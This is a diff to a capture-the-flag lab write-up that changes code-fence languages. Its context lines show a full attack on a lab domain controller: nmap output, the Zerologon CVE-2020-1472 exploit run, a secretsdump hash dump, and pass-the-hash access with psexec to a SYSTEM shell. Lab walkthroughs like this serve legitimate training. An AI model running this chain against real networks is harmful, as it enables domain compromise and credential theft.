@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap:
-
-```
+```bash
 PORT     STATE SERVICE       REASON  VERSION
 53/tcp   open  domain        syn-ack Simple DNS Plus
 88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-11-18 19:29:38Z)
@@ -100,7 +98,7 @@ A critical vulnerability with a cvss of 10. It's potentially destructive though,
 
 A good Poc can be found [here](https://github.com/dirkjanm/CVE-2020-1472).
 
-```
+```bash
 └──╼ $python cve-2020-1472-exploit.py ZERO-DC 172.31.1.29
 Performing authentication attempts...
 ====================================================================
@@ -113,7 +111,7 @@ Exploit complete!
 
 now we use secretsdump to harvest hashes with -no-password
 
-```
+```bash
 └──╼ $secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29
 Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation
 
@@ -145,7 +143,7 @@ ZERO-DC$:des-cbc-md5:e6efc7387cbcb070
 
 Now we psexec.py we can get access using the hashes
 
-```
+```bash
 └──╼ $psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29
 Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation
 
@@ -164,10 +162,10 @@ C:\Windows\system32>
 
 Flags can now be harvested:
 
-User flag is in C:\Users\jared\Desktop folder  
+User flag is in C:\Users\jared\Desktop folder
 `type Access.txt`
 
-System flag is in Administrator's Desktop folder  
+System flag is in Administrator's Desktop folder
 `type System.txt`
 
 And it's done!
